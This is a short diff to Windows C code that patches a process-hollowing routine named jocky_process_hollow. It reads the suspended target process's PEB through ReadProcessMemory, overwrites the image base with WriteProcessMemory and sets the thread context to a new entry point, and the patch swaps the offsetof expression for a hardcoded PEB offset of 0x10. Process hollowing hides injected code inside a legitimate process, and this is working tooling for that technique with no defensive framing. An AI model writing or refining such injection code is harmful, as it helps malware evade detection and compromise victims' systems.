@@ -12,7 +12,9 @@
 #include <winternl.h>
 #include <stdio.h>
 
-#pragma comment(lib, "ntdll.lib")
+#ifndef PEB_IMAGE_BASE_OFFSET
+#define PEB_IMAGE_BASE_OFFSET 0x10
+#endif
 
 typedef NTSTATUS (NTAPI* pNtUnmapViewOfSection)(HANDLE, PVOID);
 typedef NTSTATUS (NTAPI* pNtQueryInformationProcess)(
@@ -71,7 +73,7 @@ bool jocky_process_hollow(const wchar_t* target_path,
     PVOID targetImageBase = NULL;
     SIZE_T read = 0;
     if (!ReadProcessMemory(pi.hProcess,
-                           (PCHAR)pbi.PebBaseAddress + offsetof(PEB, ImageBaseAddress),
+                           (PCHAR)pbi.PebBaseAddress + PEB_IMAGE_BASE_OFFSET,
                            &targetImageBase, sizeof(targetImageBase), &read)) {
         TerminateProcess(pi.hProcess, 1);
         CloseHandle(pi.hThread);
@@ -116,7 +118,7 @@ bool jocky_process_hollow(const wchar_t* target_path,
 
     /* 8. Update PEB ImageBase */
     WriteProcessMemory(pi.hProcess,
-                       (PCHAR)pbi.PebBaseAddress + offsetof(PEB, ImageBaseAddress),
+                       (PCHAR)pbi.PebBaseAddress + PEB_IMAGE_BASE_OFFSET,
                        &newImage, sizeof(newImage), &written);
 
     /* 9. Set thread context to new entry point */
